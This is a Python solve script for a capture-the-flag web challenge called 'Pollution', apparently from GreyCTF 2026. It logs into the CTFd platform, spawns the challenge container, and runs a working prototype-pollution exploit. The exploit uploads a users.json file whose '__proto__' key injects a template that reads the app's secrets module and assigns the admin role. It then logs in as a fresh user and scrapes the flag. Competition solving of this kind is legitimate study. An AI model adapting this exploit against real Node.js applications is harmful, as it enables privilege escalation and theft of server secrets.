#!/usr/bin/env python3
"""
All-in-one Pollution solver: CTFd session login -> spawn/resolve whale for
challenge 25 -> run prototype-pollution exploit -> print + save grey{...}.

Run from repo root:
  cd /media/vad/Work2/hackathon/greyctf-2026
  uv run --with requests python challenges/ezpz/06_pollution/solve/full_solve.py
Optional: pass a known target URL to skip whale spawn:
  ... full_solve.py http://host:port
"""
import os
import re
import sys
import json
import time
import random

import requests
import urllib3

urllib3.disable_warnings()

ENV = "/media/vad/Work2/hackathon/greyctf-2026/.env"
SOLVE_DIR = os.path.dirname(os.path.abspath(__file__))
FLAG_RE = re.compile(r"grey\{[^}\n]{1,256}\}")


def load_env():
    env = {}
    try:
        with open(ENV) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                env[k.strip()] = v.strip().strip('"').strip("'")
    except FileNotFoundError:
        pass
    return env


def ctfd_login(base, user, pw):
    s = requests.Session()
    s.verify = False
    lp = s.get(f"{base}/login").text
    m = re.search(r"csrfNonce['\"]?\s*[:=]\s*['\"]([0-9a-f]{16,})", lp)
    nonce = m.group(1) if m else ""
    s.post(
        f"{base}/login",
        data={"name": user, "password": pw, "nonce": nonce, "_submit": "Submit"},
        allow_redirects=True,
    )
    me = s.get(f"{base}/api/v1/users/me")
    ok = me.status_code == 200 and me.headers.get("content-type", "").startswith("application/json")
    # fresh csrf from authed page
    pg = s.get(f"{base}/challenges").text
    m2 = re.search(r"csrfNonce['\"]?\s*[:=]\s*['\"]([0-9a-f]{16,})", pg)
    csrf = m2.group(1) if m2 else nonce
    return s, csrf, ok, me.text[:200]


def resolve_target(data):
    if not isinstance(data, dict):
        return None
    d = data.get("data", data)
    if isinstance(d, str):
        s = d.strip()
        if s.startswith("http"):
            return s
        if ":" in s:
            return "http://" + s
        return None
    if isinstance(d, dict):
        ua = d.get("user_access")
        if isinstance(ua, str) and ua:
            return ua if ua.startswith("http") else "http://" + ua
        host = d.get("domain") or d.get("lan_domain") or d.get("ip") or d.get("host")
        port = d.get("port")
        if isinstance(port, (list, tuple)) and port:
            port = port[0]
        if host and port:
            return f"http://{host}:{port}"
        if host and str(host).count(":") == 1:
            return "http://" + host
    return None


def whale(base, s, csrf):
    cid = 25
    gets = [
        f"{base}/api/v1/plugins/ctfd-whale/container?challenge_id={cid}",
        f"{base}/plugins/ctfd-whale/container?challenge_id={cid}",
    ]
    posts = list(gets)
    hdr = {"CSRF-Token": csrf, "X-CSRF-Token": csrf, "Content-Type": "application/json"}

    def parse(r):
        try:
            return r.json()
        except Exception:
            return {"_raw": r.text[:200], "_code": r.status_code}

    # 1. existing?
    for ep in gets:
        try:
            j = parse(s.get(ep))
        except Exception as e:
            j = {"_err": str(e)}
        print(f"[whale] GET {ep} -> {json.dumps(j)[:300]}")
        t = resolve_target(j)
        if t:
            return t
    # 2. spawn
    for ep in posts:
        try:
            j = parse(s.post(ep, headers=hdr, data=json.dumps({"challenge_id": cid})))
        except Exception as e:
            j = {"_err": str(e)}
        print(f"[whale] POST {ep} -> {json.dumps(j)[:300]}")
    time.sleep(6)
    # 3. re-get
    for ep in gets:
        try:
            j = parse(s.get(ep))
        except Exception as e:
            j = {"_err": str(e)}
        print(f"[whale] GET2 {ep} -> {json.dumps(j)[:300]}")
        t = resolve_target(j)
        if t:
            return t
    return None


def exploit(target):
    target = target.rstrip("/")
    print(f"[*] exploit target = {target}")
    anchors = ["alice", "bob", "carol", "admin"]
    # gadget: ${...} runs in module scope -> flag into both username and bio
    tpl = (
        '{"username":"${require(\'./secrets\').flag}",'
        '"bio":"${require(\'./secrets\').flag}",'
        '"role":"admin"}'
    )
    for anchor in anchors:
        sess = requests.Session()
        sess.verify = False
        payload = [{"lcUsername": anchor, "__proto__": {"userAutoCreateTemplate": tpl}}]
        files = {"upload-users": ("users.json", json.dumps(payload), "application/json")}
        try:
            r1 = sess.post(f"{target}/upload/users", files=files, allow_redirects=False, timeout=20)
        except Exception as e:
            print(f"[!] upload error ({anchor}): {e}")
            continue
        pwuser = f"pwn{random.randint(100000, 999999)}"
        try:
            r2 = sess.post(
                f"{target}/login",
                data={"username": pwuser, "password": "pwpass1"},
                headers={"Referer": f"{target}/login"},
                allow_redirects=True,
                timeout=20,
            )
        except Exception as e:
            print(f"[!] login error ({anchor}): {e}")
            continue
        texts = [r2.text]
        for path in ("/profile", "/"):
            try:
                texts.append(sess.get(f"{target}{path}", timeout=20).text)
            except Exception:
                pass
        print(f"[*] anchor={anchor} upload={r1.status_code} login={r2.status_code} user={pwuser}")
        for t in texts:
            m = FLAG_RE.search(t or "")
            if m and m.group(0) != "grey{placeholder}":
                return m.group(0)
    return None


def main():
    env = load_env()
    base = env.get("CTFD_URL", "https://ctfd.nusgreyhats.org").rstrip("/")

    target = None
    if len(sys.argv) > 1 and sys.argv[1].startswith("http"):
        target = sys.argv[1]
    else:
        s, csrf, ok, me = ctfd_login(base, env.get("CTFD_USER", ""), env.get("CTFD_PASS", ""))
        print(f"[*] ctfd login ok={ok} me={me[:120]}")
        target = whale(base, s, csrf)
        print(f"[*] resolved target = {target}")

    if not target:
        print("RESULT_FLAG=NO_TARGET")
        return 3

    # wait for service
    base_t = target.rstrip("/")
    for i in range(40):
        try:
            requests.get(base_t + "/", timeout=5, verify=False)
            print(f"[*] service reachable after {i}")
            break
        except Exception:
            time.sleep(1)

    flag = exploit(target)
    if flag:
        print(f"RESULT_FLAG={flag}")
        with open(os.path.join(SOLVE_DIR, "flag.txt"), "w") as f:
            f.write(flag + "\n")
        return 0
    print("RESULT_FLAG=NOT_FOUND")
    return 1


if __name__ == "__main__":
    sys.exit(main())
